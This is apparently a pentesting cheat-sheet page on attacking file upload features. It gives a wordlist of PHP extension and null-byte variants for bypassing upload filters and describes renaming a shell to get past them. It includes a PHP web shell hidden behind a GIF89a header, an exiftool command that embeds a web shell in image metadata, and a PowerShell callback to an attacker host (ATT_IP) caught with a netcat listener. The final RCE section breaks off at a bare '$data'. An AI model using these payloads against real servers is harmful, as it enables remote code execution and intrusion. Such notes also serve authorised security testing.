# File Upload

## PHP file

### PHP wordlist extension

```
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

<figure><img src="../../../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

### Rename it

We can rename our shell and upload it as **`shell.php.jpg`**. It passed the filter and the file is executed as php.

**php** phtml, .php, .php3, .php4, .php5, and .inc

**asp** asp, .aspx

**perl** .pl, .pm, .cgi, .lib

**jsp** .jsp, .jspx, .jsw, .jsv, and .jspf

**Coldfusion** .cfm, .cfml, .cfc, .dbm

### GIF89a;

If they check the content. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

### In image

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```

Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file

mv lo.jpg lo.php.jpg



## PowerShell file

Simple payload to check if the script will be executes

{% code title="test.ps1" %}
```powershell
Invoke-WebRequest -Uri ATT_IP:ATT_PORT
```
{% endcode %}

{% hint style="info" %}
We have to execute this command in the attack machine before `nc -lnvp ATT_PORT`
{% endhint %}

If we received a request from a machine, it means that our script will execute by someone.

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



### RCE with ps1 file.

Upload this payload the command that we want will be executes in the target machine and the output will be send in our listener.

```
$data
```

